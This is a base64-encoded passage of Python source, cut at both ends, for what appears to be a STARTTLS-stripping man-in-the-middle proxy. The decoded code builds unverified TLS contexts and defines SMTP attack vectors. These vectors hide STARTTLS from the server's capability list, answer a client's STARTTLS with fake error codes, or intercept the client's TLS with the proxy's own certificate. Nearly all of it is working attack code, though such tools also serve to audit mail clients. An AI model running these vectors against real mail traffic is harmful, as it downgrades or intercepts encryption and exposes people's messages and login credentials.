CAgICAgICAgICAgIGxvZ2dlci5lcnJvcigiJXMgPSAlcyAtIGZpbGUgbm90IGZvdW5kIiUoa25hbWUsIHJlcHIodmFsdWUpKSkNCiAgICAgICAgICAgICAgICAgICAgaWYgc2Vzc2lvbjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2dlci5lcnJvcigibWFpbjogcmVtb3ZpbmcgYWxsIHNvY2tldHMgYXNzb2NpYXRlZCB3aXRoIHNlc3Npb24gdGhhdCByYWlzZWQgZXhjZXB0aW9uOiAlcyIlcmVwcihzZXNzaW9uKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmNsb3NlKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBTZXNzaW9uVGVybWluYXRlZEV4Y2VwdGlvbjogcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5pbnB1dF9saXN0LmRpZmZlcmVuY2VfdXBkYXRlKHNlc3Npb24uZ2V0X3BlZXJfc29ja2V0cygpKQ0KICAgICAgICAgICAgICAgICAgICBlbGlmIHNvY2sgYW5kIHNvY2shPXNlbGYuYmluZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICMgZXhjZXB0aW9uIGZvciBub24tYmluZCBzb2NrZXQgLSBwcm9iYWJseSBmaW5lIHRvIGNsb3NlIGFuZCByZW1vdmUgaXQgZnJvbSBvdXIgbGlzdA0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmVycm9yKCJtYWluOiByZW1vdmluZyBzb2NrZXQgdGhhdCBwcm9iYWJseSByYWlzZWQgdGhlIGV4Y2VwdGlvbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaW5wdXRfbGlzdC5yZW1vdmUoc29jaykNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICMgdGhpcyBpcyBqdXN0IHN1cGVyLWZhdGFsIC0gc29tZXRoaW5nIGhhcHBlbmVkIHdoaWxlIHByb2Nlc3Npbmcgb3VyIGJpbmQgc29ja2V0Lg0KICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgICAgICAgIA0KDQpjbGFzcyBWZWN0b3JzOg0KICAgIF9UTFNfQ0VSVEZJTEUgPSAic2VydmVyLnBlbSINCiAgICBfVExTX0tFWUZJTEUgPSAic2VydmVyLnBlbSINCiAgICANCiAgICBjbGFzcyBHRU5FUklDOg0KICAgICAgICBfUFJPVE9fSUQgPSBOb25lDQogICAgICAgIGNsYXNzIEludGVyY2VwdDoNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgcHJvdG8gaW5kZXBlbmRlbnQgbXNnX3BlZWsgYmFzZWQgdGxzIGludGVyY2VwdGlvbg0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOiByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKTogcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBvbl9yZWN2X3BlZWsoc2Vzc2lvbiwgc19pbik6DQogICAgICAgICAgICAgICAgaWYgc19pbi5zb2NrZXRfc3NsOg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICAgICAgICAgIHNzbF92ZXJzaW9uID0gc2Vzc2lvbi5wcm90b2NvbC5kZXRlY3RfcGVla190bHMoc19pbikNCiAgICAgICAgICAgICAgICBpZiBzc2xfdmVyc2lvbjoNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmluZm8oIlNTTCBIYW5kc2hha2UgZGV0ZWN0ZWQgLSBwZXJmb3JtaW5nIHNzbC90bHMgY29udmVyc2lvbiIpDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRleHQgPSBWZWN0b3JzLkdFTkVSSUMuSW50ZXJjZXB0LmNyZWF0ZV9zc2xfY29udGV4dCgpDQogICAgICAgICAgICAgICAgICAgICAgICBjb250ZXh0LmxvYWRfY2VydF9jaGFpbihjZXJ0ZmlsZT1WZWN0b3JzLl9UTFNfQ0VSVEZJTEUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXlmaWxlPVZlY3RvcnMuX1RMU19LRVlGSUxFKQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNzbF93cmFwX3NvY2tldF93aXRoX2NvbnRleHQoY29udGV4dCwgc2VydmVyX3NpZGU9VHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD4gWyAgICAgIF0gICAgICAgICAgU1NMIGhhbmRzaGFrZSBkb25lOiAlcyIlKHNlc3Npb24sIHNlc3Npb24uaW5ib3VuZC5zb2NrZXRfc3NsLmNpcGhlcigpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc3NsX3dyYXBfc29ja2V0X3dpdGhfY29udGV4dChjb250ZXh0LCBzZXJ2ZXJfc2lkZT1GYWxzZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPD4gW3NlcnZlcl0gICAgICAgICAgU1NMIGhhbmRzaGFrZSBkb25lOiAlcyIlKHNlc3Npb24sIHNlc3Npb24ub3V0Ym91bmQuc29ja2V0X3NzbC5jaXBoZXIoKSkpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24sIGU6DQogICAgICAgICAgICAgICAgICAgICAgICBsb2dnZXIud2FybmluZygiRXhjZXB0aW9uIC0gbm90IHNzbCBpbnRlcmNlcHRpbmcgb3V0Ym91bmQ6ICVzIiVyZXByKGUpKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIGNyZWF0ZV9zc2xfY29udGV4dChwcm90bz1zc2wuUFJPVE9DT0xfU1NMdjIzLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmVyaWZ5X21vZGU9c3NsLkNFUlRfTk9ORSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvdG9jb2xzPU5vbmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wdGlvbnM9Tm9uZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2lwaGVycz0iQUxMIik6DQogICAgICAgICAgICAgICAgcHJvdG9jb2xzID0gcHJvdG9jb2xzIG9yICgnUFJPVE9DT0xfU1NMdjMnLCdQUk9UT0NPTF9UTFN2MScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnUFJPVE9DT0xfVExTdjFfMScsJ1BST1RPQ09MX1RMU3YxXzInKQ0KICAgICAgICAgICAgICAgIG9wdGlvbnMgPSBvcHRpb25zIG9yICgnT1BfQ0lQSEVSX1NFUlZFUl9QUkVGRVJFTkNFJywnT1BfU0lOR0xFX0RIX1VTRScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdPUF9TSU5HTEVfRUNESF9VU0UnLCdPUF9OT19DT01QUkVTU0lPTicpDQogICAgICAgICAgICAgICAgY29udGV4dCA9IHNzbC5TU0xDb250ZXh0KHByb3RvKQ0KICAgICAgICAgICAgICAgIGNvbnRleHQudmVyaWZ5X21vZGUgPSB2ZXJpZnlfbW9kZQ0KICAgICAgICAgICAgICAgICMgcmVzZXQgcHJvdG9jb2wsIG9wdGlvbnMNCiAgICAgICAgICAgICAgICBjb250ZXh0LnByb3RvY29sID0gMA0KICAgICAgICAgICAgICAgIGNvbnRleHQub3B0aW9ucyA9IDANCiAgICAgICAgICAgICAgICBmb3IgcCBpbiBwcm90b2NvbHM6DQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQucHJvdG9jb2wgfD0gZ2V0YXR0cihzc2wsIHAsIDApDQogICAgICAgICAgICAgICAgZm9yIG8gaW4gb3B0aW9uczoNCiAgICAgICAgICAgICAgICAgICAgY29udGV4dC5vcHRpb25zIHw9IGdldGF0dHIoc3NsLCBvLCAwKQ0KICAgICAgICAgICAgICAgIGNvbnRleHQuc2V0X2NpcGhlcnMoY2lwaGVycykNCiAgICAgICAgICAgICAgICByZXR1cm4gY29udGV4dA0KICAgICAgICAgICAgICAgIA0KICAgICAgICBjbGFzcyBJbmJvdW5kSW50ZXJjZXB0Og0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBwcm90byBpbmRlcGVuZGVudCBtc2dfcGVlayBiYXNlZCB0bHMgaW50ZXJjZXB0aW9uDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgIyBwZWVrIGFnYWluIC0gbWFrZSBzdXJlIHRvIGNoZWNrIGZvciBpbmJvdW5kIHNzbCBjb25uZWN0aW9ucw0KICAgICAgICAgICAgICAgICMgIGJlZm9yZSBmb3J3YXJkaW5nIGRhdGEgdG8gdGhlIGluYm91bmQgY2hhbm5lbA0KICAgICAgICAgICAgICAgICMganVzdCBpbiBjYXNlIHNlcnZlciBpcyBmYXN0ZXIgd2l0aCBhbnN3ZXIgdGhhbiBjbGllbnQgd2l0aCBoZWxsbw0KICAgICAgICAgICAgICAgICMgIGxpa2VseSBpZiBzbXRwZCBhbmQgc3RyaXB0bHMgYXJlIHJ1bm5pbmcgb24gdGhlIHNhbWUgc2VnbWVudA0KICAgICAgICAgICAgICAgICMgIGFuZCBjbGllbnQgaXMgbm90Lg0KICAgICAgICAgICAgICAgIGlmIG5vdCBzZXNzaW9uLmluYm91bmQuc29ja2V0X3NzbDoNCiAgICAgICAgICAgICAgICAgICAgIyBvbmx5IHBlZWsgaWYgaW5ib3VuZCBpcyBub3QgaW4gdGxzIG1vZGUgeWV0DQogICAgICAgICAgICAgICAgICAgICMga2luZCBvZiBhIGhhY2sgYnV0IGFsbG93IGFkZGl0aW9uYWwgMC4xIHNlY3MgZm9yIHRoZSBjbGllbnQNCiAgICAgICAgICAgICAgICAgICAgIyAgdG8gc2VuZCBpdHMgaGVsbG8NCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjEpDQogICAgICAgICAgICAgICAgICAgIFZlY3RvcnMuR0VORVJJQy5JbnRlcmNlcHRJbmJvdW5kLm9uX3JlY3ZfcGVlayhzZXNzaW9uLCBzZXNzaW9uLmluYm91bmQpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6IA0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgb25fcmVjdl9wZWVrKHNlc3Npb24sIHNfaW4pOg0KICAgICAgICAgICAgICAgIGlmIHNfaW4uc29ja2V0X3NzbDoNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgICAgICAgICBzc2xfdmVyc2lvbiA9IHNlc3Npb24ucHJvdG9jb2wuZGV0ZWN0X3BlZWtfdGxzKHNfaW4pDQogICAgICAgICAgICAgICAgaWYgc3NsX3ZlcnNpb246DQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5pbmZvKCJTU0wgSGFuZHNoYWtlIGRldGVjdGVkIC0gcGVyZm9ybWluZyBzc2wvdGxzIGNvbnZlcnNpb24iKQ0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICBjb250ZXh0ID0gVmVjdG9ycy5HRU5FUklDLkludGVyY2VwdC5jcmVhdGVfc3NsX2NvbnRleHQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGV4dC5sb2FkX2NlcnRfY2hhaW4oY2VydGZpbGU9VmVjdG9ycy5fVExTX0NFUlRGSUxFLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5ZmlsZT1WZWN0b3JzLl9UTFNfS0VZRklMRSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zc2xfd3JhcF9zb2NrZXRfd2l0aF9jb250ZXh0KGNvbnRleHQsIHNlcnZlcl9zaWRlPVRydWUpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw+IFsgICAgICBdICAgICAgICAgIFNTTCBoYW5kc2hha2UgZG9uZTogJXMiJShzZXNzaW9uLCBzZXNzaW9uLmluYm91bmQuc29ja2V0X3NzbC5jaXBoZXIoKSkpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24sIGU6DQogICAgICAgICAgICAgICAgICAgICAgICBsb2dnZXIud2FybmluZygiRXhjZXB0aW9uIC0gbm90IHNzbCBpbnRlcmNlcHRpbmcgaW5ib3VuZDogJXMiJXJlcHIoZSkpDQogICAgICAgICAgICANCiAgICBjbGFzcyBTTVRQOg0KICAgICAgICBfUFJPVE9fSUQgPSAyNQ0KICAgICAgICBjbGFzcyBTdHJpcEZyb21DYXBhYmlsaXRpZXM6DQogICAgICAgICAgICAnJycgMSkgRm9yY2UgU2VydmVyIHJlc3BvbnNlIHRvICpOT1QqIGFubm91bmNlIFNUQVJUVExTIHN1cHBvcnQNCiAgICAgICAgICAgICAgICAyKSByYWlzZSBleGNlcHRpb24gaWYgY2xpZW50IHRyaWVzIHRvIG5lZ290aWF0ZWQgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBhbnkoZSBpbiBzZXNzaW9uLm91dGJvdW5kLnNuZGJ1Zi5sb3dlcigpIGZvciBlIGluICgnZWhsbycsJ2hlbG8nKSkgYW5kICIyNTAiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIGZlYXR1cmVzID0gW2YgZm9yIGYgaW4gZGF0YS5zdHJpcCgpLnNwbGl0KCcNCicpIGlmIG5vdCAiU1RBUlRUTFMiIGluIGZdDQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBmZWF0dXJlc1stMV0uc3RhcnRzd2l0aCgiMjUwICIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgZmVhdHVyZXNbLTFdID0gZmVhdHVyZXNbLTFdLnJlcGxhY2UoIjI1MC0iLCIyNTAgIikgICMgZW5kIG1hcmtlcg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0gJw0KJy5qb2luKGZlYXR1cmVzKSsnDQonIA0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIoZGF0YSkpDQogICAgICAgICAgICAgICAgZWxpZiAibWFpbCBmcm9tIiBpbiBkYXRhLmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICANCiAgICAgICAgY2xhc3MgU3RyaXBXaXRoSW52YWxpZFJlc3BvbnNlQ29kZToNCiAgICAgICAgICAgICcnJyAxKSBGb3JjZSBTZXJ2ZXIgcmVzcG9uc2UgdG8gY29udGFpbiBTVEFSVFRMUyBldmVuIHRob3VnaCBpdCBkb2VzIG5vdCBzdXBwb3J0IGl0IChqdXN0IGJlY2F1c2Ugd2UgY2FuKQ0KICAgICAgICAgICAgICAgIDIpIFJlc3BvbmQgdG8gY2xpZW50IFNUQVJUVExTIHdpdGggaW52YWxpZCByZXNwb25zZSBjb2RlDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgYW55KGUgaW4gc2Vzc2lvbi5vdXRib3VuZC5zbmRidWYubG93ZXIoKSBmb3IgZSBpbiAoJ2VobG8nLCdoZWxvJykpIGFuZCAiMjUwIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICBmZWF0dXJlcyA9IGxpc3QoZGF0YS5zdHJpcCgpLnNwbGl0KCINCiIpKQ0KICAgICAgICAgICAgICAgICAgICBmZWF0dXJlcy5pbnNlcnQoLTEsIjI1MC1TVEFSVFRMUyIpICAgICAjIGFkZCBTVEFSVFRMUyBmcm9tIGNhcGFiaWxpdGllcw0KICAgICAgICAgICAgICAgICAgICAjaWYgIlNUQVJUVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICAjICAgIGZlYXR1cmVzID0gW2YgZm9yIGYgaW4gZmVhdHVyZXMgaWYgbm90ICJTVEFSVFRMUyIgaW4gZl0gICAgIyByZW1vdmUgU1RBUlRUTFMgZnJvbSBjYXBhYmlsaXRpZXMNCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9ICcNCicuam9pbihmZWF0dXJlcykrJw0KJyANCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAiU1RBUlRUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zZW5kYWxsKCIyMDAgU1RSSVBUTFMNCiIpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIjIwMCBTVFJJUFRMUw0KIikpKQ0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICJtYWlsIGZyb20iIGluIGRhdGEubG93ZXIoKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIA0KICAgICAgICBjbGFzcyBTdHJpcFdpdGhUZW1wb3JhcnlFcnJvcjoNCiAgICAgICAgICAgICcnJyAxKSBmb3JjZSBzZXJ2ZXIgZXJyb3Igb24gY2xpZW50IHNlbmRpbmcgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAiU1RBUlRUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zZW5kYWxsKCI0NTQgVExTIG5vdCBhdmFpbGFibGUgZHVlIHRvIHRlbXBvcmFyeSByZWFzb24NCiIpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIjQ1NCBUTFMgbm90IGF2YWlsYWJsZSBkdWUgdG8gdGVtcG9yYXJ5IHJlYXNvbg0KIikpKQ0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICJtYWlsIGZyb20iIGluIGRhdGEubG93ZXIoKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICANCiAgICAgICAgY2xhc3MgU3RyaXBXaXRoRXJyb3I6DQogICAgICAgICAgICAnJycgMSkgZm9yY2Ugc2VydmVyIGVycm9yIG9uIGNsaWVudCBzZW5kaW5nIFNUQVJUVExTDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIlNUQVJUVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgiNTAxIFN5bnRheCBlcnJvcg0KIikNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiNTAxIFN5bnRheCBlcnJvcg0KIikpKQ0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICJtYWlsIGZyb20iIGluIGRhdGEubG93ZXIoKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIA0KICAgICAgICBjbGFzcyBVbnRydXN0ZWRJbnRlcmNlcHQ6DQogICAgICAgICAgICAnJycgMSkgRG8gbm90IG1hbmdsZSBzZXJ2ZXIgZGF0YQ0KICAgICAgICAgICAgICAgIDIpIGludGVyY2VwdCBjbGllbnQgU1RBUlRMUywgbmVnb3RpYXRlZCBzc2xfY29udGV4dCB3aXRoIGNsaWVudCBhbmQgb25lIHdpdGggc2VydmVyLCB1bnRydXN0ZWQuDQogICAgICAgICAgICAgICAgICAgaW4gY2FzZSBjbGllbnQgZG9lcyBub3QgY2hlY2sga2V5cw0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgIyBkbyBpbmJvdW5kIFNUQVJUVExTDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zZW5kYWxsKCIyMjAgR28gYWhlYWQNCiIpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gWyAgICAgIF1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIjIyMCBHbyBhaGVhZA0KIikpKQ0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0ID0gVmVjdG9ycy5HRU5FUklDLkludGVyY2VwdC5jcmVhdGVfc3NsX2NvbnRleHQoKQ0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0LmxvYWRfY2VydF9jaGFpbihjZXJ0ZmlsZT1WZWN0b3JzLl9UTFNfQ0VSVEZJTEUsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXlmaWxlPVZlY3RvcnMuX1RMU19LRVlGSUxFKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFsgICAgICBdW21hbmdsZWRdIHdhaXRpbmcgZm9yIGluYm91bmQgU1NMIGhhbmRzaGFrZSIlKHNlc3Npb24pKQ0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc3NsX3dyYXBfc29ja2V0X3dpdGhfY29udGV4dChjb250ZXh0LCBzZXJ2ZXJfc2lkZT1UcnVlKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw+IFsgICAgICBdICAgICAgICAgIFNTTCBoYW5kc2hha2UgZG9uZTogJXMiJShzZXNzaW9uLCBzZXNzaW9uLmluYm91bmQuc29ja2V0X3NzbC5jaXBoZXIoKSkpDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAjIG91dGJvdW5kIHNzbA0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLm91dGJvdW5kLnNlbmRhbGwoZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA9PiBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihkYXRhKSkpDQogICAgICAgICAgICAgICAgICAgIHJlc3BfZGF0YSA9IHNlc3Npb24ub3V0Ym91bmQucmVjdl9ibG9ja2VkKCkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihyZXNwX2RhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgaWYgIjIyMCIgbm90IGluIHJlc3BfZGF0YToNCiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFByb3RvY29sVmlvbGF0aW9uRXhjZXB0aW9uKCJ3aG9vcCE/IGNsaWVudCBzZW50IFNUQVJUVExTIGV2ZW4gdGhvdWdoIHdlIGRpZCBub3QgYW5ub3VuY2UgaXQuLiBwcm90byB2aW9sYXRpb246ICVzIiVyZXByKHJlc3BfZGF0YSkpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPT4gW3NlcnZlcl1bbWFuZ2xlZF0gcGVyZm9ybWluZyBvdXRib3VuZCBTU0wgaGFuZHNoYWtlIiUoc2Vzc2lvbikpDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc3NsX3dyYXBfc29ja2V0KCkgICAgDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPD4gW3NlcnZlcl0gICAgICAgICAgU1NMIGhhbmRzaGFrZSBkb25lOiAlcyIlKHNlc3Npb24sIHNlc3Npb24ub3V0Ym91bmQuc29ja2V0X3NzbC5jaXBoZXIoKSkpDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICJtYWlsIGZyb20iIGluIGRhdGEubG93ZXIoKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgDQogICAgICAgIGNsYXNzIEluYm91bmRTdGFydHRsc1Byb3h5Og0KICAgICAgICAgICAgJycnIEluYm91bmQgaXMgc3RhcnR0bHMsIG91dGJvdW5kIGlzIHBsYWluDQogICAgICAgICAgICAgICAgMSkgRG8gbm90IG1hbmdsZSBzZXJ2ZXIgZGF0YQ0KICAgICAgICAgICAgICAgIDIpIGludGVyY2VwdCBjbGllbnQgU1RBUlRMUywgbmVnb3RpYXRlZCBzc2xfY29udGV4dCB3aXRoIGNsaWVudCBhbmQgb25